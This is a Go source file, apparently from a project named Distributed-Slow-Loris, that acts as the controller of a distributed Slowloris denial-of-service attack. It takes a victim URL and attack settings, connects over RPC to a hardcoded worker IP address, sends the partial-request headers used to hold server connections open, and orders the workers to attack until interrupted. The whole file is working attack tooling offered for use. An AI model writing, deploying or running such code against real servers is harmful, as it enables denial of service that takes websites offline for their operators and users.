package main

import (
  "flag"
  "net/rpc"
  "github.com/AashrayAnand/Distributed-Slow-Loris/shared"
  "fmt"
  "os"
  "os/signal"
)

const (
  port = "3000" // port that worker(s) listen on
  NUM_TERM_ATTEMPTS = 5 // max # of attempts to terminate worker connection
  SETSTATE = "Worker.SetState"
  SETHEADERS = "Worker.SetHeaders"
  ATTACK = "Worker.Attack"
  TERM = "Worker.Terminate"
)

/*
type WorkerInfo struct {
        conn      *rpc.Client
        addr      workerAddress
}*/

type BroadCaster struct {
        clients   []*rpc.Client
        workers   []string
}

func main() {
  endpoint := flag.String("endpoint", "", "endpoint which will be victim of slowloris attack")
  delay := flag.Int("delay", 10, "time to wait between writes to specified endpoint")
  numAttackers := flag.Int("threads", 10, "number of threads to be dispatched to execute attacks")
  timeout := flag.Int("timeout", 0, "optional timeout (if you want attack to eventually terminate)")
  flag.Parse()
  // set delay to be at least 5 seconds
  if *delay < 5 {
    *delay = 5
  }


  // exit if no endpoint provided
  if *endpoint == "" {
    fmt.Println("usage: broadcaster -endpoint <url> ...")
    return
  }

  // list of worker addresses
  workers := [...]string{"18.219.140.44:"}
  broadcaster := &BroadCaster{clients: make([]*rpc.Client, 0), workers: make([]string, 0)}

  // add single EC2 to list of workers, planning for  eventually managing multiple workers
  for _, worker := range workers {
    broadcaster.workers = append(broadcaster.workers, worker)
  }

  // establish RPC clients for each worker
  for _, address := range broadcaster.workers {
    conn, err := rpc.Dial("tcp", address + port)
    if err != nil {
      fmt.Println("failed to connect to worker at  address:", address)
      continue
    }
    // add RPC client for host to list of clients
    fmt.Println("RPC client created for address:", address)
    broadcaster.clients = append(broadcaster.clients, conn)
  }

  // store important state to be sent to worker
  workerState := &shared.State {
    Endpoint:     *endpoint,
    Delay:        *delay,
    NumAttackers: *numAttackers,
    Timeout:      *timeout,
  }

  // set headers used for slow loris attack
  workerHeaders := &shared.Headers{
    Base: []byte("GET / HTTP/1.0\r\n"),
    //General: []byte("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept-language: en-US,en,q=0.5"),
    Loris: []byte("X-a 1\r\n"),
  }

  // attack request and response paramters, only needed to
  // satisfy RPC convention
  attackReq := 0
  attackRes := 0

  // store status codes for setting worker state (only necessary to uphold RPC convention)
  var setStateRes, setHeadersRes int

  // use RPC to set important headers/state for all workers, and execute attacks
  for _, conn := range broadcaster.clients {
    go func() {
      if err := conn.Call(SETHEADERS, workerHeaders, &setHeadersRes); err != nil {
        fmt.Println("Error setting headers for worker")
      }
      if err := conn.Call(SETSTATE, workerState, &setStateRes); err != nil {
        fmt.Println("Error setting headers for worker")
      }
      if err := conn.Call(ATTACK, attackReq, &attackRes); err != nil {
        fmt.Println("Error executing attack")
      }
    }()
  }


  interruptChan := make(chan os.Signal, 1)
  doneChan := make(chan int)
  // send SIGINT to interruptChan
  signal.Notify(interruptChan, os.Interrupt)
  // blocking goroutine, waits on OS interrupt to
  // execute termination RPC, main is blocked on response
  go func() {
    <-interruptChan
    fmt.Println("Goodbye")
    for _, conn := range broadcaster.clients {
      var req, res int
      // terminate slow loris attacks
      for i := 0; i < NUM_TERM_ATTEMPTS; i++ {
        if err := conn.Call(TERM, req, &res); err == nil {
          fmt.Println("attempt #", i, "successfully terminated connection")
          break
        }
          fmt.Println("attempt #", i, "error terminating connection, trying again")
      }
    }
    // unblock main after terminating slow loris attacks
    doneChan<-1
  }()
  <-doneChan
}
